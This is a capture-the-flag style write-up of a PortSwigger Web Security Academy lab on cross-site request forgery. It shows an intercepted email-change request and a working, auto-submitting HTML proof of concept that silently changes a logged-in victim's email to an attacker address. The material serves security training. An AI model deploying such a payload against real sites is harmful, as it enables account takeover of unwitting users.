## Labs Covered

This write-up focuses on the following labs from the PortSwigger Web Security Academy related to **Cross-Site Request Forgery (CSRF)**:

**1 CSRF vulnerability with no defenses**
<blockquote>
This lab demonstrates how attackers can exploit CSRF vulnerabilities in applications that lack any protection against such attacks.
</blockquote>

---

### LAB 1 - CSRF vulnerability with no defenses

### Lab Description

![image](https://github.com/user-attachments/assets/4fb83958-726b-44f8-964f-a62baf495341)

### Solution

## Overview

This lab demonstrates a basic **Cross-Site Request Forgery (CSRF)** attack where the email change functionality is not protected by any anti-CSRF mechanisms.

---

## Step-by-Step Walkthrough

### 1. Logging In

- I logged into the application using the provided credentials:

```http
Username: wiener
Password: peter
````

![image](https://github.com/user-attachments/assets/f1e65c51-136c-467c-85a7-172edfd3d912)


### 2. Navigating to Vulnerable Functionality

- After login, I navigated to the **My Account** page.
- I observed an **Update email address** form where users can change their registered email.

### 3. Analyzing the Request in Burp Suite

- I intercepted the email change request in **Burp Suite**.
- The POST request looked like this:

```http
POST /my-account/change-email HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Cookie: session=your_session_cookie

email=admin@abc.com
```

![image](https://github.com/user-attachments/assets/30dd02a7-43ed-44fb-b8fa-01f698c32105)


* Key Observations:

  * No anti-CSRF tokens were present.
  * No custom headers like `X-CSRF-Token`.
  * Only a single parameter: `email`.

This confirmed that the application **lacked CSRF protection**.

---

## 4. Generating the CSRF Proof of Concept (PoC)

* In Burp, I right-clicked the request and selected:

  ```
  Engagement tools > Generate CSRF PoC
  ```

![image](https://github.com/user-attachments/assets/34b1dc5b-ab68-40b7-be55-a4264637dc9a)

* I enabled the **Auto-submit script** from the **Options** tab.

![image](https://github.com/user-attachments/assets/d6184a2c-0382-4b9d-b269-33b9c3885102)


* Final CSRF HTML PoC:

```html
<html>
  <body>
    <form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="email-attacker@example.com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

Replace `YOUR-LAB-ID` with your actual lab domain.

---

## 5. Delivering the Exploit

* I hosted the PoC on the **exploit server** provided in the lab.
* Clicked **"Deliver exploit to victim"**.

  ![image](https://github.com/user-attachments/assets/182b5309-2372-408c-8f59-2f01ecc1561a)

  
* When the victim (logged-in user) visited the page, their email was silently changed to `email-attacker@example.com`.

![image](https://github.com/user-attachments/assets/90512ba2-ef1b-4b29-88c9-3444c238bbeb)

---




